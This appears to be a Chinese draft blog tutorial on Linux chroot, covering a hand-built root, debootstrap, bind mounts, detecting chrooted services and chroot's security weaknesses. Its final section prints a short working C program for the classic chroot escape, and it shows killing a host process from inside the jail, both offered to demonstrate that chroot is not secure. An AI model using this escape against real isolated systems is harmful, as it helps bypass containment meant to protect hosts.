---
title: "chroot实践"
date: 2022-04-24T16:43:29+08:00
author: whowin
sidebar: false
authorbox: false
toc: true
pager: true
categories:
  - "Linux"
tags:
draft: true
#references: 
# chroot
#  - [chroot](https://wiki.debian.org/chroot)
#  - [chroot](https://en.wikipedia.org/wiki/Chroot)
#  - [Debootstrap](https://wiki.debian.org/Debootstrap)
#  - [The Bash Hackers Wiki](https://wiki.bash-hackers.org/)
#  - [COMPLETE INTRO TO CONTAINERS](https://btholt.github.io/complete-intro-to-containers/)
#  - [Demystifying Containers - Part I: Kernel Space](https://medium.com/@saschagrunert/demystifying-containers-part-i-kernel-space-2c53d6979504)
#  - [Is chroot a security feature?](https://www.redhat.com/en/blog/chroot-security-feature)
#  - [How to break out of a chroot() jail](http://www.unixwiz.net/techtips/mirror/chroot-break.html)
#  - [Find out if service / server running in chrooted jail or not under Linux](https://www.cyberciti.biz/tips/linux-chroot-service.html)
#  - [How do I tell I'm running in a chroot?](https://unix.stackexchange.com/questions/14345/how-do-i-tell-im-running-in-a-chroot)
#  - [jailkit](https://olivier.sessink.nl/jailkit/jailkit.8.html)
# chroot中文
#  - [zh_CNDebootstrap](https://wiki.debian.org/zh_CN/Debootstrap)
#  - [建立 debian 的 chroot 環境](https://datahunter.org/chroot)
#  - [chroot环境搭建](https://www.cnblogs.com/abnk/p/15127456.html)
# fstab
#  -[Understanding the /etc/fstab File in Linux](https://www.2daygeek.com/understanding-linux-etc-fstab-file/)
postid: 100005
---

## 导言
* *chroot* 是类 UNIX 操作系统中的一个功能，它可以改变当前运行的进程以及子进程的根目录
* *chroot* 的历史几乎和 **UNIX** 一样古老，在 **Linux** 出现之前就已经存在了
* *chroot* 在 ubuntu 的发行版中是默认安装的
* 本文试图全面理解 *chroot* 的功能
* *chrrot* 需要有 **root** 权限才可以执行
* 本文的所有例子均在 ubuntu 20.04 下完成，其它发行版的 Linux 可能会有不同

## chroot实践
* 初识 *chroot*
  - *chroot* 的用法非常简单，通常情况下，只要 *chroot <新的根目录路径> \[执行的命令\]* 即可，让我们先来试一下
    ```
    mkdir ~/my-new-root
    echo "My super secret thing" >> ~/my-new-root/secret.txt
    sudo chroot ~/my-new-root
    ```
  - 上例中，我们先建了一个新目录，然后在这个目录下建了一个文本文件，最后我们 *chroot* 到这个目录下，但是出错了

    ![初次使用chroot出错][img01]

    **图1：初次使用chroot出错**

  - 错误提示显示，无法运行 */bin/bash*，为什么会出现这样的错误呢？
  - 因为按照 *chroot* 的手册(*man chroot*)，执行 *chroot* 时如果没有指定执行的命令，会执行 *$SHELL -i*，我们看一下当前的 $SHELL 是什么
    ```
    whowin@lenovo:~$ printenv SHELL
    /bin/bash
    whowin@lenovo:~$ 
    ```
  - 在我的系统里 $SHELL 是 **/bin/bash**，也就是说，*chroot* 以后将在新的根目录下执行 */bin/bash -i*，但是在新的根目录下并没有 */bin/bash*，我们可以试着在新的根目录下加上 */bin/bash*，然后再试一下 chroot
    ```
    mkdir ~/my-new-root/bin
    cp /bin/bash ~/my-new-root/bin
    sudo chroot ~/my-new-root
    ```
  - 结果还是出错；这可能是因为 *bash* 还有一些依赖库没有拷贝过去，所以 *bash* 仍然运行不起来，我们把 *bash* 的依赖库拷贝过去，然后再试
    ```
    whowin@lenovo:~$ ldd /bin/bash
      linux-vdso.so.1 (0x00007ffc817f2000)
      libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f9e41629000)
      libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f9e41623000)
      libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9e41431000)
      /lib64/ld-linux-x86-64.so.2 (0x00007f9e417a1000)
    whowin@lenovo:~$ mkdir ~/my-new-root/lib{,64}
    whowin@lenovo:~$ cp /lib/x86_64-linux-gnu/libtinfo.so.6 /lib/x86_64-linux-gnu/libdl.so.2 /lib/x86_64-linux-gnu/libc.so.6 ~/my-new-root/lib/
    whowin@lenovo:~$ cp /lib64/ld-linux-x86-64.so.2 ~/my-new-root/lib64/
    whowin@lenovo:~$ sudo chroot ~/my-new-root/
    bash-5.0# 
    ```
  - 这次居然成功了，我们发现，运行 *pwd* 可以，但是运行 *ls* 却不成功，这是因为 *pwd* 是 *bash* 的内建命令，而 *ls* 是外部命令，我们并没有把 *ls* 拷贝过来，我们仿效拷贝 bash 的方法，把 *ls* 拷贝过来
  - 顺便说一句 *chroot* 以后的退出命令是 *exit*
    ```
    bash-5.0# exit
    exit
    whowin@lenovo:~$ cp /bin/ls ~/my-new-root/bin
    whowin@lenovo:~$ ldd /bin/ls
      linux-vdso.so.1 (0x00007fff25be8000)
      libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f3471b7c000)
      libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f347198a000)
      libpcre2-8.so.0 => /usr/lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f34718fa000)
      libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f34718f4000)
      /lib64/ld-linux-x86-64.so.2 (0x00007f3471be8000)
      libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f34718d1000)
    whowin@lenovo:~$ cp /lib/x86_64-linux-gnu/libselinux.so.1 /lib/x86_64-linux-gnu/libpthread.so.0 ~/my-new-root/lib/
    whowin@lenovo:~$ mkdir -p ~/my-new-root/usr/lib/
    whowin@lenovo:~$ cp /usr/lib/x86_64-linux-gnu/libpcre2-8.so.0 ~/my-new-root/usr/lib/
    whowin@lenovo:~$ sudo chroot ~/my-new-root/
    bash-5.0# ls
    bin  lib  lib64  secret.txt  usr
    bash-5.0# pwd
    /
    bash-5.0# 
    ```
  - 这次我们 *chroot* 以后，*ls* 命令也可以执行了，而且在目录清单中，我们发现了最开始建立的文件 **secret.txt**，说明我们当前的目录正是我们开始建立的那个目录
  - 为了能够打印出 **secret.txt** 的内容，可以自己试着把 *cat* 命令拷贝过来

* debootstrap 工具
  - 前面我们简单地试了一下 chroot，可以看出来手工去完成一个完整的文件系统还是很麻烦的，的确是这样，Linux文件系统是有专门的规范的，叫做 [FHS(Filesystem Hierarchy Standard)][article01]，我们前面做的远远达不到标准
  - 好在在 *Debian* 系列的发行版上，可以安装一个工具帮助我们建立 *Debian* 发行版的文件系统，这个工具就是 *debootstrap*
  - *debootstrap* 可以很方便第在 Ddebian 的系统上建立一个符合标准的 Debian 的文件系统，而且这个工具的安装和使用均很容易
  - 我现在使用的系统是 64bit 的 Ubuntu 20.04，下面的例子中，我们安装 *debootstrap* 并在这个系统下安装一个 32bit 的 ubuntu 16.04 的文件系统
    + **安装 debootstrap**
      ```
      sudo apt install debootstrap
      ```
    + **debootstrap 的使用**
      ```
      debootstrap --no-check-gpg --arch=<硬件架构> <版本代号> <目标目录> <镜像地址>
        --no-check-gpg    不检查gpg签名
        debootstrap将从 镜像地址 下载指定 版本代号 的系统，并在 目标目录 下，按照指定的架构构建文件系统
      ```
    + **可以使用的硬件架构**
      1. x86_32位系统(386, 486, 586, 686)：--arch=i386
      2. x86_64位系统：--arch=amd64
      3. AArch64：--arch=arm64
      4. MIPS64el：--arch=mips64el
    + **ubuntu 稳定版本代号**
      |序号|ubuntu版本|代号|
      |:--:|:-------|:---|
      |1|Ubuntu 16.04|Xenial|
      |2|Ubuntu 18.04|Bionic|
      |3|Ubuntu 20.04|Focal|
      |4|Ubuntu 22.04|Jammy|
    + **debian 稳定版本代号**
      |序号|debian版本|代号|
      |:--:|:-------|:---|
      |1|Debian 8|Jessie|
      |2|Debian 9|Stretch|
      |3|Debian 10|Buster|
      |4|Debian 11|Bullseye|
    + **构建一个 amd64 的 ubuntu 18.04**
      ```
      mkdir -p ~/chroot-fs/bionic-amd64
      sudo debootstrap --no-check-gpg --arch=amd64 bionic ~/chroot-fs/bionic-amd64/ http://mirrors.163.com/ubuntu/
      ```
    + 这个过程时间比较长，请耐心等待
    + ubuntu 可以使用国内的任一镜像(比如上例中的163)；debian 的镜像建议使用http://deb.debian.org/debian，CDN会帮助你选择合适的镜像
    + 不出意外会顺利完成
      ```
      sudo chroot ~/chroot-fs/bionic-amd64/
      ```
## chroot 的设置
* *chroot* 到一个新的根目录后，你会发现有些命令是无法执行的，比如：*ps*，执行以后会出现错误

  ![执行 ps 出错][img02] 

  **图2：chroot 后执行 ps 出错**

* **挂载 /proc 和 /sys**
  - 实际上 debootstrap 建立的根目录并不完整，按照 [debian wiki][article02] 的说明，至少还要从源系统上挂载两个目录过来，完成这个步骤之前请务必记得先退出 chroot
    ```
    root@lenovo:/# exit
    exit
    whowin@lenovo:~$ sudo mount --bind /proc ~/chroot-fs/bionic-amd64/proc
    whowin@lenovo:~$ sudo mount --bind /sys ~/chroot-fs/bionic-amd64/sys
    whowin@lenovo:~$ 
    ```
  - 然后再 chroot，执行 ps
    ```
    whowin@lenovo:~$ sudo chroot ~/chroot-fs/bionic-amd64/
    root@lenovo:/# ps
      PID TTY          TIME CMD
    18689 ?        00:00:00 sudo
    18690 ?        00:00:00 bash
    18693 ?        00:00:00 ps
    root@lenovo:/# 
    ```
  - 现在再执行 *ps* 就不会有问题了
  - 但是，我们不能每次 *chroot* 之前都手工挂载这两个目录，我们需要把这两个挂载放到 **/etc/fstab 文件中**，以便系统启动时自动挂载
  - /etc/fstab 这个文件只有 root 才能修改
    ```
    whowin@lenovo:~$ MY_CHROOT=~/chroot-fs/bionic-amd64
    whowin@lenovo:~$ sudo su -c "echo 'proc $MY_CHROOT/proc proc defaults 0 0' >> /etc/fstab"
    whowin@lenovo:~$ sudo su -c "echo 'sysfs $MY_CHROOT/sys sysfs defaults 0 0' >> /etc/fstab"
    whowin@lenovo:~$ 
    ```
  - 增加这两行时一定要小心核实，以免在系统重新启动时出现麻烦
  - 完成以后，重启系统，再 *chroot* 以后，可以看到新的根目录下 **/proc** 和 **/sys** 都已经挂在好了，而且 *ps* 也是可以正常运行的
* 完善现有系统
  - 这个系统其实很不好用，我们可以试着使用 vi 编辑一个文件
    ```
    cd ~
    vi test.txt
    ```
  - 我们发现方向键和退格键等都不能用，这是因为 vi 在 HOME 目录下没有找到其配置文件 .vimrc，我们处理一下
    ```
    cp /etc/vim/vimrc $HOME/.vimrc
    ```
  - 现在再使用 vi 编辑文件就可以了
  - 也可以在这个根文件系统上安装软件，比如可以试一下安装一个 vim
    ```
    apt-get install vim
    ```
* 这个 chroot 有什么用
  - 可以用来构建一个标准测试环境进行应用软件的测试
  - 如果要对一个开发的应用进行打包，包括把该应用的依赖一起打进包里，可以建立一个 chroot 的环境，并在这个环境下进行
  - 如果你是服务器的管理者，可以在 chroot 下运行某些服务，比如 httpd 服务，这样可以和宿主系统有效地隔离
  - 如果你是服务器的管理者，当有用户登录到服务器时，你可以让他/她实际登录到一个 chroot 的根目录下，有效地和宿主系统隔离
* 让用户登录到 chroot 的根目录下
* 在 chroot 下提供 httpd 服务
## 判断**服务/服务器**是否在chroot下
* 通过以上的说明，我们可以了解到，当我们登录了一台服务器时，我们可能登录的是一个 *chroot* 的根目录；当我们使用服务器上的某个服务时，这个服务可能也是在 chroot 下运行的；如何判断一个服务或者服务器是否在 chroot 下呢？
* 先以服务器为例，判断你登录的服务器是否在 chroot 下服务
  - 我们以 httpd 服务为例，我们首先在 chroot 下安装一个 nginx 并运行，然后回到宿主系统去看看如何判断 httpd 服务是在 chroot 下运行的
  - 在 chroot 下
    ```
    sudo chroot ~/chroot-fs/bionic-amd64/
    apt install nginx
    service nginx start
    ```
  - 在宿主系统
    ```
    whowin@lenovo:/$ pidof nginx
    22035 22034 22033 22032 22031
    whowin@lenovo:/$ sudo ls -ld /proc/22031/root
    lrwxrwxrwx 1 root root 0 4月  27 20:55 /proc/22031/root -> /home/whowin/chroot-fs/bionic-amd64
    whowin@lenovo:/$ sudo ls -ld /proc/22032/root
    lrwxrwxrwx 1 www-data www-data 0 4月  27 22:17 /proc/22032/root -> /home/whowin/chroot-fs/bionic-amd64
    whowin@lenovo:/$ 
    ```
  - 可以很清楚地看到，/proc/22031/root 指向了一个 chroot 目录，如果不是在chroot下运行的，应该指向 "//"
## chroot 的问题
* 上面这样的 chroot 环境，尽管已经有些用处，但问题也很多
* 进入 *chroot* 必须要有 **root** 权限，这个并不是 *chroot* 的 bug，而是其功能所必须的，否则 *chroot* 后将无法返回
* 我们举个例子来说明上面这个 chroot 的问题
  - 启动两个终端窗口，我们称之为 #1 和 #2
  - 在 #1 上执行 top，我们知道，如果我们不退出，top 会一直显示着系统状况，并不断刷新
  - 在 #2 上 chroot 到上面建立的目录，*sudo chroot ~/chroot-fs/bionic-amd64*
  - 在 #2 上执行 *ps aux|grep top* 可以找到在 #1 上运行的 top 进程
  - 在 #2 上杀掉 #1 上运行的 top 进程 *kill -9 PID*
    ```
    whowin@lenovo:~$ sudo chroot ~/chroot-fs/bionic-amd64/
    root@lenovo:/# ps aux|grep top
    chrootu+    9557  0.5  0.0  15340  4292 ?        S+   03:42   0:00 top
    root        9590  0.0  0.0  11460  1048 ?        S+   03:42   0:00 grep --color=auto top
    root@lenovo:/# kill -9 9557
    root@lenovo:/# 
    ```
  - 在 #1 上你会看到 top 已经停止运行了
  - 这个例子说明尽管 chroot 把用户封锁在了一个目录中，但其拥有的权限还是足以对系统造成破坏

* 从 *chroot* 中逃脱出来
  - *chroot* 后，貌似用户被锁在了一个目录下，实际上即便不退出 *chroot*，也是可以从这个锁定的目录中逃脱出来的
  - 下面这个小程序在 *chroot* 以后去执行，这个程序最后会启动一个 shell，在这个shell中，你会惊讶地发现，你已经在宿主系统的的根目录下
  - 这个程序大致进行了下列步骤：
    + 建立一个临时目录(一会儿要从 *chroot* 到这个临时目录下)
    + *chroot* 到这个临时目录下
    + *cd ..* 若干次
    + *chroot* 到当前目录
    + 启动一个新的 shell
  - 源代码
    ```
    #include <sys/stat.h>
    #include <unistd.h>

    int main(void) {
        mkdir(".out", 0755);
        chroot(".out");
        chdir("../../../../../");
        chroot(".");
        return execl("/bin/bash", "-i", NULL);
    }
    ```
  - 为了编译这个程序，你可以在 *chroot* 以后安装一个 *gcc*，*apt install gcc*
  - 这是一个经典的逃脱 chroot 的方法；这段程序再一次告诉我们chroot* 并不安全
* 上面描述的 chroot 还有一些别的问题，总之，这个 chroot 并不安全

## 命名空间(namespaces)









[img01]:../../../../static/images/100005/chroot-first-error.png
[img02]:../../../../static/images/100005/chroot-ps-error.png



[article01]:https://refspecs.linuxfoundation.org/FHS_3.0/fhs-3.0.pdf
[article02]:https://wiki.debian.org/chroot
